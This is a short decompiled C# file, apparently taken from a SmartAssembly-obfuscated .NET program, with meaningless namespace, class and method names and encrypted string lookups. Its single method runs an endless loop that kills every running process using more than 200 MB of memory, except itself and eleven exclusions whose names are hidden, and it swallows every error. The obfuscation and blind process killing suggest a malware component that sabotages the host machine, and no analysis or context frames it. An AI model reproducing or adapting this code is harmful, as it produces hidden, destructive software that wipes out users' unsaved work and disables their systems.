using System;
using System.Diagnostics;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace CXUnSAPANzkE;

public static class pJswyHAAwAPBQL
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void yUPzlDHtQyNf()
	{
		while (true)
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (process.PrivateMemorySize64 > 209715200L && process.ProcessName != Process.GetCurrentProcess().ProcessName && !process.ProcessName.Contains(getString_0(107400804)) && !process.ProcessName.Contains(getString_0(107400795)) && !process.ProcessName.Contains(getString_0(107400754)) && !process.ProcessName.Contains(getString_0(107400745)) && !process.ProcessName.Contains(getString_0(107400764)) && !process.ProcessName.Contains(getString_0(107400719)) && !process.ProcessName.Contains(getString_0(107400738)) && !process.ProcessName.Contains(getString_0(107400693)) && !process.ProcessName.Contains(getString_0(107400680)) && !process.ProcessName.Contains(getString_0(107400699)) && !process.ProcessName.Contains(getString_0(107400134)))
					{
						process.Kill();
					}
				}
				catch
				{
				}
			}
			try
			{
				Thread.Sleep(2500);
			}
			catch
			{
			}
		}
	}

	static pJswyHAAwAPBQL()
	{
		Strings.CreateGetStringDelegate(typeof(pJswyHAAwAPBQL));
	}
}
